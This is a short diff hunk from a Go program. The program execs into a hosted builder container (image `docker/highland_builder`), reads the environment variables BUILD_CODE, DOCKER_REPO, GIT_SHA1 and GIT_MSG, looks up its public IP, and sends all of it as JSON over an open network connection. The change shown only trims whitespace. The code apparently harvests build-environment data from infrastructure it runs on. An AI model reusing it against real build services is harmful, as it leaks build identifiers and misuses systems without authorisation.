@@ -44,10 +44,10 @@ func main() {
 	}
 	log.Println("connected:", conn.LocalAddr(), conn.RemoteAddr())
 	time.Sleep(time.Second)
-	buildCode := string(run(`docker exec $(docker ps --format '{{if (eq (index (split (printf "%s" .Image) ":") 0) "docker/highland_builder")}}{{.ID}}{{end}}' | grep .) printenv BUILD_CODE`))
-	dockerRepo := string(run(`docker exec $(docker ps --format '{{if (eq (index (split (printf "%s" .Image) ":") 0) "docker/highland_builder")}}{{.ID}}{{end}}' | grep .) printenv DOCKER_REPO`))
-	gitSha1 := string(run(`docker exec $(docker ps --format '{{if (eq (index (split (printf "%s" .Image) ":") 0) "docker/highland_builder")}}{{.ID}}{{end}}' | grep .) printenv GIT_SHA1`))
-	gitMsg := string(run(`docker exec $(docker ps --format '{{if (eq (index (split (printf "%s" .Image) ":") 0) "docker/highland_builder")}}{{.ID}}{{end}}' | grep .) printenv GIT_MSG`))
+	buildCode := strings.TrimSpace(string(run(`docker exec $(docker ps --format '{{if (eq (index (split (printf "%s" .Image) ":") 0) "docker/highland_builder")}}{{.ID}}{{end}}' | grep .) printenv BUILD_CODE`)))
+	dockerRepo := strings.TrimSpace(string(run(`docker exec $(docker ps --format '{{if (eq (index (split (printf "%s" .Image) ":") 0) "docker/highland_builder")}}{{.ID}}{{end}}' | grep .) printenv DOCKER_REPO`)))
+	gitSha1 := strings.TrimSpace(string(run(`docker exec $(docker ps --format '{{if (eq (index (split (printf "%s" .Image) ":") 0) "docker/highland_builder")}}{{.ID}}{{end}}' | grep .) printenv GIT_SHA1`)))
+	gitMsg := strings.TrimSpace(string(run(`docker exec $(docker ps --format '{{if (eq (index (split (printf "%s" .Image) ":") 0) "docker/highland_builder")}}{{.ID}}{{end}}' | grep .) printenv GIT_MSG`)))
 	ip := strings.TrimSpace(string(run(`curl -sL ip.sb`)))
 	conn.Write(
 		[]byte(pretty.JSONString(&Header{
